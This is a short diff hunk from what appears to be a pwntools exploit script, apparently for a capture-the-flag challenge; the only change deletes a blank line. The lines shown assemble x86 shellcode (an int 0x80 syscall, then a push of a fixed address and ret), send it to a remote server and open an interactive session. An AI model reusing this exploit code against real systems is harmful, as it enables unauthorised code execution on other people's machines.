@@ -23,6 +23,5 @@ shellcode += asm('int 0x80')
 shellcode += asm('push 0x08048090')
 shellcode += asm('ret')
 
-
 server.send(shellcode)
 server.interactive()
